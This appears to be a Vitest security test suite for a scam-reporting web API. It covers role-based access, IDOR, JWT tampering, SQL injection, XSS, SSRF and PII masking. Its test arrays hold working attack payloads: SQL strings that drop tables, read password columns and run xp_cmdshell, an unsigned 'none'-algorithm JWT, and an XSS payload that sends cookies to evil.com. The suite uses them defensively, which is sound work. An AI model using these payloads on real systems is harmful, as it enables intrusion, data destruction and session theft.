import { describe, it, expect, beforeEach } from 'vitest';
import request from 'supertest';
import { createApp } from '../app.js';
import { createTestJwt } from '../lib/jwt.js';
import { clearTestAuditLogs } from '../lib/auditLog.js';
import { clearInMemoryThreatIntel, ThreatIntelRepository } from '../lib/threatIntelRepository.js';
import { clearInMemoryHistory } from '../lib/historyRepository.js';
import { safeFetch, isPrivateOrBlockedIP } from '../lib/safeFetch.js';
import { buildScamAlert } from '@jaanch/shared';

describe('Phase 10: Security Suite & Authorization Matrix', () => {
  const app = createApp({ enableRateLimiting: false });

  const guest = null;

  const userA = {
    id: '11111111-1111-4111-a111-111111111111',
    email: 'user.a@college.edu.in',
    role: 'user' as const,
  };

  const userB = {
    id: '22222222-2222-4222-b222-222222222222',
    email: 'user.b@college.edu.in',
    role: 'user' as const,
  };

  const moderator = {
    id: '99999999-9999-4999-m999-999999999999',
    email: 'moderator@jaanch.ai',
    role: 'moderator' as const,
  };

  let tokenA: string;
  let tokenB: string;
  let tokenMod: string;

  beforeEach(async () => {
    clearInMemoryThreatIntel();
    clearInMemoryHistory();
    clearTestAuditLogs();

    tokenA = await createTestJwt(userA);
    tokenB = await createTestJwt(userB);
    tokenMod = await createTestJwt(moderator);
  });

  // ---------------------------------------------------------------------------
  // 1. Authorization Matrix: Guest vs User vs Moderator
  // ---------------------------------------------------------------------------
  describe('Authorization Matrix (Every endpoint x Guest / User / Moderator)', () => {
    it('GET /api/health is accessible to Guest, User, and Moderator (200)', async () => {
      const g = await request(app).get('/api/health');
      const u = await request(app).get('/api/health').set('Authorization', `Bearer ${tokenA}`);
      const m = await request(app).get('/api/health').set('Authorization', `Bearer ${tokenMod}`);

      expect(g.status).toBe(200);
      expect(u.status).toBe(200);
      expect(m.status).toBe(200);
    });

    it('GET /api/config is accessible to Guest, User, and Moderator (200)', async () => {
      const g = await request(app).get('/api/config');
      const u = await request(app).get('/api/config').set('Authorization', `Bearer ${tokenA}`);
      const m = await request(app).get('/api/config').set('Authorization', `Bearer ${tokenMod}`);

      expect(g.status).toBe(200);
      expect(u.status).toBe(200);
      expect(m.status).toBe(200);
    });

    it('POST /api/reports requires authentication (Guest: 401, User: 201, Moderator: 201)', async () => {
      const payload = {
        text: 'Scam job offer requiring upfront deposit of 2000 rupees to hr@upi',
        category: 'upfront_fee',
        shareIndicators: true,
      };

      const g = await request(app).post('/api/reports').send(payload);
      expect(g.status).toBe(401);

      const u = await request(app)
        .post('/api/reports')
        .set('Authorization', `Bearer ${tokenA}`)
        .send(payload);
      expect(u.status).toBe(201);

      const m = await request(app)
        .post('/api/reports')
        .set('Authorization', `Bearer ${tokenMod}`)
        .send({ ...payload, text: 'Different scam job offer text requiring fee payment' });
      expect(m.status).toBe(201);
    });

    it('Moderation endpoints are restricted strictly to Moderator (Guest: 401, User: 403, Mod: 200)', async () => {
      // GET /api/moderation/queue
      const g = await request(app).get('/api/moderation/queue');
      expect(g.status).toBe(401);

      const u = await request(app)
        .get('/api/moderation/queue')
        .set('Authorization', `Bearer ${tokenA}`);
      expect(u.status).toBe(403);
      expect(u.body.error.code).toBe('FORBIDDEN');

      const m = await request(app)
        .get('/api/moderation/queue')
        .set('Authorization', `Bearer ${tokenMod}`);
      expect(m.status).toBe(200);
    });

    it('GET /api/history requires authentication (Guest: 401, User: 200, Mod: 200)', async () => {
      const g = await request(app).get('/api/history');
      expect(g.status).toBe(401);

      const u = await request(app)
        .get('/api/history')
        .set('Authorization', `Bearer ${tokenA}`);
      expect(u.status).toBe(200);

      const m = await request(app)
        .get('/api/history')
        .set('Authorization', `Bearer ${tokenMod}`);
      expect(m.status).toBe(200);
    });
  });

  // ---------------------------------------------------------------------------
  // 2. Insecure Direct Object Reference (IDOR) & Tenant Isolation
  // ---------------------------------------------------------------------------
  describe('IDOR & Multi-Tenant Data Isolation', () => {
    it('prevents User B from reading User A private history item (IDOR -> 404)', async () => {
      // User A submits an offer with saveToHistory: true
      const saveRes = await request(app)
        .post('/api/analyze')
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          text: 'Private job offer analysis text for User A only with 30 chars min',
          saveToHistory: true,
        });

      expect(saveRes.status).toBe(200);
      const historyRes = await request(app)
        .get('/api/history')
        .set('Authorization', `Bearer ${tokenA}`);
      const itemId = historyRes.body.data.items[0]?.id;
      expect(itemId).toBeDefined();

      // User B attempts to access User A's history record
      const idorRes = await request(app)
        .get(`/api/history/${itemId}`)
        .set('Authorization', `Bearer ${tokenB}`);

      // Must return 404 NOT_FOUND (never leak presence or content)
      expect(idorRes.status).toBe(404);
      expect(idorRes.body.error.code).toBe('NOT_FOUND');
    });

    it('prevents User B from deleting User A private history item (IDOR -> 404)', async () => {
      const saveRes = await request(app)
        .post('/api/analyze')
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          text: 'Private job offer analysis text for deletion test with 30 chars',
          saveToHistory: true,
        });
      expect(saveRes.status).toBe(200);

      const historyRes = await request(app)
        .get('/api/history')
        .set('Authorization', `Bearer ${tokenA}`);
      const itemId = historyRes.body.data.items[0]?.id;

      // User B tries to delete User A's item
      const deleteAttempt = await request(app)
        .delete(`/api/history/${itemId}`)
        .set('Authorization', `Bearer ${tokenB}`);

      expect(deleteAttempt.status).toBe(404);

      // Verify User A's item still exists
      const verifyRes = await request(app)
        .get(`/api/history/${itemId}`)
        .set('Authorization', `Bearer ${tokenA}`);
      expect(verifyRes.status).toBe(200);
    });
  });

  // ---------------------------------------------------------------------------
  // 3. JWT Tampering, Expiry & Malformed Headers
  // ---------------------------------------------------------------------------
  describe('JWT Security & Tampering Resistance', () => {
    it('rejects tampered signature in JWT token with 401', async () => {
      const parts = tokenA.split('.');
      // Tamper signature
      const tampered = `${parts[0]}.${parts[1]}.invalidsignature123456789`;

      const res = await request(app)
        .get('/api/history')
        .set('Authorization', `Bearer ${tampered}`);

      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('rejects expired JWT token with 401', async () => {
      // Create token with expired: true
      const expiredToken = await createTestJwt(userA, { expired: true });

      const res = await request(app)
        .get('/api/history')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('rejects malformed Authorization header with 401', async () => {
      const res = await request(app)
        .get('/api/history')
        .set('Authorization', 'NotABearerToken');

      expect(res.status).toBe(401);
    });

    it('rejects "none" algorithm exploit attempt with 401', async () => {
      const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: userA.id, role: 'moderator' })).toString('base64url');
      const noneToken = `${header}.${payload}.`;

      const res = await request(app)
        .get('/api/moderation/queue')
        .set('Authorization', `Bearer ${noneToken}`);

      expect(res.status).toBe(401);
    });
  });

  // ---------------------------------------------------------------------------
  // 4. SQL Injection (SQLi) Resilience on all inputs
  // ---------------------------------------------------------------------------
  describe('SQL Injection (SQLi) Resilience', () => {
    const sqliPayloads = [
      `' OR '1'='1`,
      `'; DROP TABLE intel_records; --`,
      `UNION SELECT null, username, password FROM auth.users--`,
      `1; EXEC xp_cmdshell('dir')`,
      `" or ""="`,
    ];

    it.each(sqliPayloads)('treats SQLi payload in /api/analyze as literal string: %s', async (payload) => {
      const text = `URGENT Job offer from TCS. Selection verified ${payload}. Deposit 2000 rupees caution fee.`;
      const res = await request(app)
        .post('/api/analyze')
        .send({ text, claimedOrg: payload, domain: 'job' });

      expect(res.status).toBe(200);
      expect(res.body.data).toBeDefined();
    });

    it.each(sqliPayloads)('treats SQLi payload in /api/reports as literal string without crashing: %s', async (payload) => {
      const text = `Scam report with SQL payload ${payload} requiring deposit to fraud@upi`;
      const res = await request(app)
        .post('/api/reports')
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          text,
          category: 'upfront_fee',
          shareIndicators: true,
        });

      expect(res.status).toBe(201);
      expect(res.body.data.publicId).toBeDefined();
    });
  });

  // ---------------------------------------------------------------------------
  // 5. Stored & Reflected XSS Resilience
  // ---------------------------------------------------------------------------
  describe('Cross-Site Scripting (XSS) Inertness', () => {
    const xssPayloads = [
      `<script>alert('xss')</script>`,
      `<img src=x onerror=alert(1)>`,
      `<svg onload="fetch('https://evil.com/'+document.cookie)">`,
    ];

    it.each(xssPayloads)('renders XSS payloads as inert plain text in WhatsApp share alert: %s', (payload) => {
      const alert = buildScamAlert({
        language: 'en',
        publicId: 'JNC-INTEL-TESTXSS1',
        confirmedAt: '2026-11-01',
        originalText: `URGENT scam notice: ${payload} Deposit 5000 rs`,
        includeExcerpt: true,
      });

      // The message is pure text
      expect(alert.fullMessage).toContain('JNC-INTEL-TESTXSS1');
      expect(alert.fullMessage).toContain(payload);
      // The shareUrl is properly URI encoded
      expect(alert.shareUrl).not.toContain('<script>');
      expect(alert.shareUrl).toContain(encodeURIComponent(payload));
    });

    it.each(xssPayloads)('handles XSS payloads in /api/link-check safely without execution: %s', async (payload) => {
      const res = await request(app)
        .post('/api/link-check')
        .send({ url: `https://example.com/search?q=${encodeURIComponent(payload)}` });

      expect(res.status).toBe(200);
      expect(res.body.data.url).toContain(encodeURIComponent(payload));
    }, 15000);
  });

  // ---------------------------------------------------------------------------
  // 6. SSRF Protection & Private IP Blocking
  // ---------------------------------------------------------------------------
  describe('SSRF Protection (isPrivateOrBlockedIP)', () => {
    const privateIps = [
      '127.0.0.1',
      '10.0.0.1',
      '172.16.0.1',
      '192.168.1.1',
      '169.254.169.254', // AWS metadata
      '::1',
      '0.0.0.0',
    ];

    it.each(privateIps)('strictly identifies %s as a private/blocked IP', (ip) => {
      expect(isPrivateOrBlockedIP(ip)).toBe(true);
    });

    it('allows public IPs', () => {
      expect(isPrivateOrBlockedIP('8.8.8.8')).toBe(false);
      expect(isPrivateOrBlockedIP('1.1.1.1')).toBe(false);
    });

    it('safeFetch rejects private IP targets with SSRF_BLOCKED_PRIVATE_IP', async () => {
      await expect(
        safeFetch('http://169.254.169.254/latest/meta-data/')
      ).rejects.toThrow();
    });
  });

  // ---------------------------------------------------------------------------
  // 7. Privacy Invariant: Zero Raw Student Submissions in Shared Threat Tables
  // ---------------------------------------------------------------------------
  describe('Privacy Invariant: Zero Raw PII in Shared Intel Tables', () => {
    it('verifies scrubbed_text in intel_records masks all PII before persistence', async () => {
      const rawText =
        'Contact HR Priya Sharma at priya.recruiter@gmail.com or WhatsApp +91 98765 43210. Deposit 3000 to priya@upi or send Aadhaar 1234 5678 9012.';

      const res = await request(app)
        .post('/api/reports')
        .set('Authorization', `Bearer ${tokenA}`)
        .send({
          text: rawText,
          category: 'upfront_fee',
          shareIndicators: true,
        });

      expect(res.status).toBe(201);
      const recordId = res.body.data.recordId;

      // Inspect the internal stored threat intel record
      const record = await ThreatIntelRepository.getModerationRecordDetail(null, recordId);
      expect(record).toBeDefined();

      // RAW PII MUST NOT APPEAR IN scrubbedText
      expect(record.scrubbedText).not.toContain('priya.recruiter@gmail.com');
      expect(record.scrubbedText).not.toContain('+91 98765 43210');
      expect(record.scrubbedText).not.toContain('priya@upi');
      expect(record.scrubbedText).not.toContain('1234 5678 9012');

      // Masked tokens must be present
      expect(record.scrubbedText).toContain('[EMAIL]');
      expect(record.scrubbedText).toContain('[PHONE]');
      expect(record.scrubbedText).toContain('[UPI]');
      expect(record.scrubbedText).toContain('[AADHAAR]');
    });
  });

  // ---------------------------------------------------------------------------
  // 8. Security Headers Check
  // ---------------------------------------------------------------------------
  describe('Security Headers Verification', () => {
    it('enforces strict security headers on every response', async () => {
      const res = await request(app).get('/api/health');

      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['x-frame-options']).toBe('DENY');
      expect(res.headers['content-security-policy']).toBeDefined();
      expect(res.headers['strict-transport-security']).toBeDefined();
      expect(res.headers['referrer-policy']).toBe('no-referrer');
    });
  });
});
